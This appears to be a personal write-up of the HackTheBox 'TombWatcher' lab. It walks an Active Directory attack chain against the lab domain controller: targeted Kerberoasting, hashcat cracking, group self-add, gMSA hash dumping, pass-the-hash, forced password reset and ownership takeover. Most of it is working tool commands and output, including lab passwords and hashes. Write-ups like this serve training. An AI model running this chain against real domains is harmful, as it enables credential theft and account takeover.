### Given credentials
low-privileged user: `henry:H3nry_987TGV!`
### Services
![[Screenshot_20250906_104348.jpg]]
### Path
![[Screenshot_20250906_104306.jpg]]
![[Screenshot_20250906_104607.jpg]]

To abuse WriteSPN we use targetedKerberoast (https://github.com/ShutdownRepo/targetedKerberoast)

```bash
┌──(venv)─(root㉿kali)-[/opt/targetedKerberoast]
└─# python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p $(cat /tmp/henry-pass.txt) --request-user alfred --dc-ip 10.10.11.72
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

After having the Clock too skew error: https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

```bash
┌──(venv)─(root㉿kali)-[/opt/targetedKerberoast]
└─# python3 targetedKerberoast.py -d tombwatcher.htb -u henry -p $(cat /tmp/henry-pass.txt) --request-user alfred --dc-ip 10.10.11.72
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$93969a6563a3e7cb558b46b440dd8b82$e4d9c6418da7e19086ac0333965f2d25950c0653ad41238f9f8f32dcde02ea5495f2b191f2e712c255f1bd466a71d715742ea5517116eaf8056d61b68de5d6636e119862549add7862559b455aaca2d6a2c7f15416a5f1874fd37ba2b6117cbdc04e7743962a50c69ab963590a4c990050c5134bff045b9c8bec1242a31ca6a7a9c1709a1e4f208c47e08756b9d3d8839d81e94dd464b55a44a6a1c5ad49f145463b3ca79eddd08044b49a1bae007b5a15647dbe62727d66ddabe751b9cb6c70ee7dff523fb275c5d55b2e3b25570e7b4ff8d0c1c64aa94f8f6102fa1b8b9f506f2dc88229142803e82127d470ef5cd8ebfd30acfbc7fea20a1049bda360c91ba431cc775c0080d81aea9d448e4318eff701260ca9b70c957262ac374c8176637240090f31bf67fbaafd6cbec62e6d9223abeb13078bfb6386ca79cdc89371457c23f004ea5182d2c73c50970377148c6a28701ced4eb7beb510fd0ff30892a7495e6f3cf57fb0e21c31ba4b4ccc8dfe605feb60a4ec2459390a7b6efbdb5b849e1988e6f5b9aacdcf82547e4ff3085c1eab1f1c97bb20b1312dc0762d4fa61fab8d3ce43ee0067067fd7b051eb2ff90c8315607dc8b1097f1436558ff9024992b098e5abf160a3049ffa127f1e7b557a833838c7179ab13c2fcf327f5f1d9834f205086e062684c5696037af7f3386180ec55b118cd68ec2ba9625807c3776e5cd07127dc1924d219b60ea4e9185d642aa6bab3eb264bb68b07d89d5597288593c6d1702883f37c3615991aa2c7be3cfed75048500660a0b52802b4471e60c6a855cdd7acc2406c080702faf543d97e2d9c374ce6c68be89fd763cb59cb8eb8d79ebb04e18db3c9ea1eef876402842de599cceeef73ff4d9219c7d9fb95c37277ad567b66d3dda3d6af2c0660dd7282bfbc7aa322ebc4e462ee2e07be93d8d5d9f3cab97ceb1d0f554af5f121f1e33788847415b1d0ae21558766b10fdb7a7bfb489a2fac49adffee0458bd5b5cc1880799df5da77a1fe97fa7f9543950fc32071d61a6eae43951ca5160b0a94eb97162edf7320235c3070961f4a31beb9e86c3a3f774826c04b230a761bf895858f5256d8d1ff79433a0b49889bccebdae42d9ee8eabec1e0ee51b056b4a78fc2f41b7c3f6847d1bdc7ab52388365845e9458b6c955c5a1a30e3dbf891141f7bce8678df0424149479a6f858cadfbec294b3f7d6e8fda84c21d407ebd273073685f063d836d59374746a1a94245b65f9806c30c487b2f7283ad0bc98dbc30d8af639023873f12accab59737f6ae9bf5da3e8fbde078657b47c9c850edef4fb3d6f993ccc10f47caa90452ac37e1dd545c316a73e2f579db23a6abf261dfe2d3ba70bd370aad132fd897d2a16d9baf9327d5fee1ef80dd2b5388abb948f25b71bf4e9f149a87608526ed437d96e5b835f8652a621d2c0bbb55dfac8213ded79131f44b503aa0912
```

Then we use hashcat to crack the hash:

```bash
┌──(kali㉿kali)-[/Shared/CTFs/Hackthebox/TombWatcher]
└─$ sudo hashcat -m 13100 targetedKerberoast-alfred /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

[...SNIP...]                                                                                                    
                                                                                                                            
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$c03f41c91b21aced7bec6ac2634ee160$7c68f22c3b7ccfb5e4be898f9da06f89bfc1886a5d65921297f0c05169da7daa03159c230810c7021428132c9a4bc4fc84f9a99698d05fba9fe719764bb800f309b4cd439c3146a877b02f266f3813793c39ba153a140f44bd72963a899077e70728116c743e1e355112eed66ec5060ac6de8396e801d22b2e0c20556cb7931e496300a2e1b8407ea506c0375ef1ef122d66c4930100098bf42de2c11a363a45903281f196604ddab94aa7b02c98f96b6b6773806544da5d1f08dd7d2bdea69fa5d00c15dee3eef6251bd295ac1540028aa4afcc3cf13ce3eca524d46b55edfc4397980e8962b25d8705cf8d1c8ca352a1b7e02f83d8df246771b0f1d1ff914b5285dc79ae26615dc46a223c6c7b40887ddf4af508e09a57228e9108d993a7087c107324f90a41144b4519c9ac4b4813e4cfc248b8e098c52a32b89760fee8f19ee506af21eead2254f3ede8645359c30b9d936a1eb78e9d03c3f7cbddf7384731a99f91a3311f1815c7b630e2cdb40cdb37de4e3406943d1c482368c85e23559ef28eb2f942dfadf3ab6592296709f0eb5ed1bc1262f91460773950558db718309be457d65a7ca8a522f56ea42e1d85f5f47d4a79acda926d546b1d1c2865977a9ff24bd201655c00d95f18d8e970dcf06f523b4cd61ef3e718cda39fdec1b077c5eaffc50ae39fdd8b92a68563dd44431a31eda9ce2c3c4e8d687cc12f3b65edf700dcf4eba1ffc487789c1f95e61b7155a7c64fd6c13586b77d5016a815385567a826870fa63845ec29cd606a2c98ff54c3357fb80d0662a7e0a58203e0f0949674a8f305b5efb518f96efa7cc70119e47e41115137a0611fe05c85ed1def5be31273723e5819b1873692e2bc7c0d02ad07fda7732e7694d7ce7dc53c017de2d79020a3676347e810e008966bc94eaa9669a2b44bd3df6f23fa9757060487c9c2447450a86fe7df0329d9f1b790f4ca49d3b8b0d8da670b51e3ef1eae2ddda182fddbcc4e1ef526341cd67879e76a1d199c42c76431bd1e28457b220a478f47c0212fa31e78fe354c466dd82f5b8a502da857d43284538b23f5669399a8b079e0955f459dfc8fa2973ea145c70b2934a0b897b02dcb82717f458c2ded699de93d79417ab54620c5539cf2877a1c7396dd663b6aa7e066997a9bad2e31ca3124402e00f4d45ab232e531aeaff1d25ccd02c3a456f756860b8cd399de39f5c7fb3a9e4bb166343ce3b02d5ace68c479cbfca5968d8f1be34604a00ce6dfc5de261f6a7979052e6ee82e9a54db9b9dbc7807c9b1b0e4c002022ba1f4bc9de2d2363dbcc3bbf69dee95506bd54d68455bb41d14e9d7daa51160e7ba99600caa53c7328ead652b43afb3f0b8f1af0aded5bd3249663716400121f6717e5724d2f9eb7b1d325b13edef6c933a7bae867676aa8cbab90e1fe0e68e4d1f97e617b7527cc8a0c5c77e6b084f24ec9434f3de5ef84534e6ca:basketball
```

Now, with alfred we can abuse the AddSelf permision following this documentation (1 - https://www.thehacker.recipes/ad/movement/dacl/, 2 - https://www.thehacker.recipes/ad/movement/dacl/addmember). Here we need to use the "SAM Name", which we retrieved with ldapdomaindump:

![[Screenshot_20250906_185159.jpg]]

```bash
 /opt/bloodyAD  main ?1  python3 bloodyAD.py --host 10.10.11.72 -d "tombwatcher.htb" -u Alfred -p basketball add groupMember Infrastructure Alfred
[+] Alfred added to Infrastructure
```
![[Screenshot_20250906_190317.jpg]]

Now we abuse ReadGMSAPassword (https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword)

```bash
 /opt/gMSADumper  main ?1  python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb                        ✔  4s  gMSADumper   
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::ecb4146b3f99e6bbf06ca896f504227c
ansible_dev$:aes256-cts-hmac-sha1-96:dae98d218c6a20033dd7e1c6bcf37cde9a7c04a41cfa4a89091bf4c487f2f39a
ansible_dev$:aes128-cts-hmac-sha1-96:0ec1712577c58adc29a193d53fc73bd4
```

With crackstation we try to find the hash but is not there, so we try pass-the-hash attack and it seems to work:

```bash
 /opt/bloodyAD  main ?1  crackmapexec smb 10.10.11.72 -u ansible_dev$ -H ecb4146b3f99e6bbf06ca896f504227c                ✔  bloodyAD   
SMB         10.10.11.72     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ansible_dev$:ecb4146b3f99e6bbf06ca896f504227c
```

Now we can abuse ForceChangePassword (https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword), we use **[bloodyAd.py](https://github.com/CravateRouge/bloodyAD)** but we neet hash in format hash1:hash2 so we use the same format that this documentation use for `pth-net` and it works:

```bash
 /opt/bloodyAD  main ?1  python3 bloodyAD.py --host 10.10.11.72 -d "tombwatcher.htb" -u ansible_dev$ -p ffffffffffffffffffffffffffffffff:ecb4146b3f99e6bbf06ca896f504227c set password "sam" "basketball"
[+] Password changed successfully!

 /opt/gMSADumper  main ?1  crackmapexec smb 10.10.11.72 -u sam -p basketball                     
SMB         10.10.11.72     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:basketball
```

python3 targetedKerberoast.py -d tombwatcher.htb -u sam -p basketball --dc-ip 10.10.11.72

Abuse WriteOwner following this documentation (https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership)

```bash
/opt/targetedKerberoast  main ?2  owneredit.py -action write -new-owner 'sam' -target 'john' tombwatcher.htb/sam:basketball -dc-ip 10.10.11.72   

  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

After this, we update Bloodhound and appears like this:

![[Screenshot_20250906_195745.jpg]]